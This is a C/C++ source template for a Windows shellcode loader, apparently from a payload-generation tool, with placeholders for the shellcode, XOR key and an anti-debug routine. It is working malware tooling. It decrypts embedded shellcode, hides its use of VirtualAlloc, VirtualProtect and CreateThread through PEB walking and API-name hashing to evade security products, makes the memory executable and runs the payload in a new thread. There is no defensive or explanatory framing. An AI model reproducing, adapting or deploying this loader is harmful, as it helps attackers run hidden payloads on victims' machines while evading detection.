#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h> 
#include <iostream>
#include <winternl.h>
#include "helper.h"

<SHELLCODE>

char key[] = <XOR_KEY>;
unsigned int key_len = sizeof(key);
unsigned int shellcode_len = sizeof(shellcode);
const int PRIME_CONST = 31;

size_t hashUnicode(UNICODE_STRING key) {
    size_t hashCode = 0;
    //std::size_t h1 = std::hash<PWSTR>{}(key.Buffer);
    for (int i = 0; i < key.Length / 2; i++) {
        //printf("%c\n", key.Buffer[i]);
        hashCode += (key.Buffer[i] ^ hashCode) * PRIME_CONST;
        //printf("%lli\n", hashCode);
    }
    return hashCode;
}

size_t hashFunction(LPCSTR key) {
    size_t hashCode = 0;
    int length = strlen(key);
    //std::size_t h1 = std::hash<PWSTR>{}(key.Buffer);
    for (int i = 0; i < length; i++) {
        //printf("%c\n", key[i]);
        hashCode += (key[i] ^ hashCode) * PRIME_CONST;
        //printf("%lli\n", hashCode);
    }
    return hashCode;
}

void xor_data(unsigned char data[], int dataLen, char key[], int keyLen)
{
    for (int i = 0; i < dataLen; i++)
    {
        //printf("%c\n", data[i] ^ key[i % keyLen]);
        data[i] = data[i] ^ key[i % (keyLen - 1)];
    }
}


PPEB getPeb() {
    PPEB peb;
    // Thread Environment Block (TEB)
#if defined(_M_X64) // x64
    PTEB tebPtr = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
#else // x86
    PTEB tebPtr = reinterpret_cast<PTEB>(__readfsdword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
#endif

    peb = tebPtr->ProcessEnvironmentBlock;
    return peb;
}

HMODULE getLibByHash(PPEB peb, size_t hash) {
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head;
    LIST_ENTRY* curEntry = NULL;
    HMODULE modBase = NULL;

    printf("Grabbed loader\n");

    //linkedList = ldr->InMemoryOrderModuleList;
    head = &(ldr->InMemoryOrderModuleList);
    curEntry = head->Flink;

    while (true)
    {
        printf("----------------------------------------------\n");
        // find the head of the object
        //printf("GETTING THE LDR_DATA\n");
        LDR_DATA_TABLE_ENTRY* module = (LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(curEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        //printf("Got LDR_DATA\n");

        if (module == NULL)
        {
            return NULL;
        }

        if (hash == hashUnicode(module->FullDllName))
        {
            // Get base address as handle
            modBase = (HMODULE)module->DllBase;
        }
        // advance to the next object
        curEntry = curEntry->Flink;

        if (curEntry == head)
        {
            break;
        }
    }

    if (modBase)
    {
        return modBase;
    }

    else
    {
        return NULL;
    }
}


UINT_PTR getFuncByHash(HMODULE handle, size_t hash)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)handle;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + (dos)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PWORD ordinals = (PWORD)((UINT_PTR)handle + exports->AddressOfNameOrdinals);
    PDWORD names = (PDWORD)((UINT_PTR)handle + exports->AddressOfNames);
    PDWORD functions = (PDWORD)((UINT_PTR)handle + exports->AddressOfFunctions);
    for (DWORD i = 0; i < exports->NumberOfNames; i++)
    {
        LPCSTR name = (LPCSTR)((UINT_PTR)handle + names[ordinals[i]]);
        //LPCSTR name = (LPCSTR)((ULONG_PTR)kernBase + functions[ordinals[i]]);
        if (hashFunction(name) == hash)
        {
            return ((UINT_PTR)handle + functions[ordinals[i]]);
        }
    }

    return NULL;
}


<ANTI_DEBUG>


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    void* payloadPtr = nullptr;
    BOOL rv;
    HANDLE th;
    DWORD oldProtect = 0;
    HINSTANCE kernelHandle;
    CREATETHREAD createThread = NULL;
    VIRTUALALLOC  virtualAlloc = NULL;
    VIRTUALPROTECT virtualProtect = NULL;
    PPEB pebPtr;

    // Anti debug check
    antiDebug();

    // Get a handle to the PEB and use it to get a handle to the kernel
    pebPtr = getPeb();
    kernelHandle = getLibByHash(pebPtr, KERNELHASH);

    // Create thread dynamic pull
    createThread = (CREATETHREAD)getFuncByHash(kernelHandle, CREATETHREADHASH);
    if (!createThread)
    {
        // handle the error
        FreeLibrary(kernelHandle);
        return 2;
    }
    // Virtual Alloc dynamic pull
    virtualAlloc = (VIRTUALALLOC)getFuncByHash(kernelHandle, VIRTUALALLOCHASH);
    if (!virtualAlloc)
    {
        // handle the error
        FreeLibrary(kernelHandle);
        return 2;
    }

    // Virtual protect dynamic pull
    virtualProtect = (VIRTUALPROTECT)getFuncByHash(kernelHandle, VIRTUALPROTECTHASH);
    if (!virtualProtect)
    {
        // handle the error
        FreeLibrary(kernelHandle);
        return 2;
    }

    // XOR shellcode
    xor_data(shellcode, shellcode_len, key, key_len);
    //printf("Shellcode decrypted, injecting\n");
    // Allocate memory to write payload into memory
    //printf("Allocating memory\n");
    payloadPtr = virtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy payload to memory
    //printf("Copying buffer\n");
    RtlMoveMemory(payloadPtr, shellcode, shellcode_len);
    xor_data(shellcode, shellcode_len, key, key_len);
    // Change permissions to RX
    //printf("Changing to execute permissions\n");
    rv = virtualProtect(payloadPtr, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);


    if (rv != 0)
    {
        //printf("Starting thread\n");
        //Create thread at start of memory
        th = createThread(0, 0, (LPTHREAD_START_ROUTINE)payloadPtr, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}
